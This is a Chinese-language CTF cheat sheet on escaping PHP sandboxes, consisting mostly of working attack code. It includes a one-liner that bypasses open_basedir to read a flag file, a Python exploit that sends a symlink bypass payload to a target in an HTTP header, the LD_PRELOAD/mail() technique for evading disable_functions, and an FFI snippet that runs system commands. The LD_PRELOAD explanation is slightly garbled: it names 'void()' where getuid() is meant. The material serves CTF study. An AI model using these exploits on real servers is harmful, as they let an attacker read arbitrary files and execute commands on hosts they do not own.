# PHP中的重要函数

## open_basedir绕过

```php
chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
```

分析：https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/


symlink 法

```python
def exploit(f):
    #print f
    payload="""
error_reporting(E_ALL);
chdir("/var/www/html/sandbox/f700deb7a6e26f106e3103e6257bb68a75a1a5f3/");
mkdir('./{0}/b/c/d/e/f/g/',0777,TRUE);
symlink('./{0}/b/c/d/e/f/g','{1}');
ini_set('open_basedir','/var/www/html/sandbox/f700deb7a6e26f106e3103e6257bb68a75a1a5f3:{2}/');
symlink('{1}/../../../../../../','{2}');
unlink('{1}');
echo base64_encode(file_get_contents('{2}{3}'));
""".format(randomstr(),randomstr(),randomstr(),f)
    poc= payload.replace("\n",'')
    #print poc
    headers = {
        "eki":poc
    }
    req=requests.get(url,headers=headers)
    print req.text
```

### 扩展资料

https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/


## Bypass ``disabled_function``

### LD_PRELOAD

原理：

PHP 的 ``putenv()``函数，设定 ``LD_PRELOAD(环境变量)`` 为 ``hack.so``。

利用 PHP 的 ``mail()``函数，``mail()`` 内部启动新进程 ``/usr/sbin/sendmail``，因为上一步 ``LD_PRELOAD``的作用，``sendmail`` 调用的``void()``函数 被优先级更好的 ``hack.so`` 中的同名 ``getuid()``函数所劫持。

#### Exp

https://github.com/ianxtianxt/bypass_disablefunc_via_LD_PRELOAD

### php 7.4 FFI


根据官方文档``FFI``是可以直接调用系统函数的

比如这样

```php
<?php
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("id > /tmp/eki");
echo file_get_contents("/tmp/eki");
@unlink("/tmp/eki");
```

**但是``FFI API``仅能适用于预加载文件**

## require_once

php源码分析 require_once 绕过不能重复包含文件的限制：https://www.anquanke.com/post/id/213235

## file_get_content

关于file_put_contents的一些小测试: https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/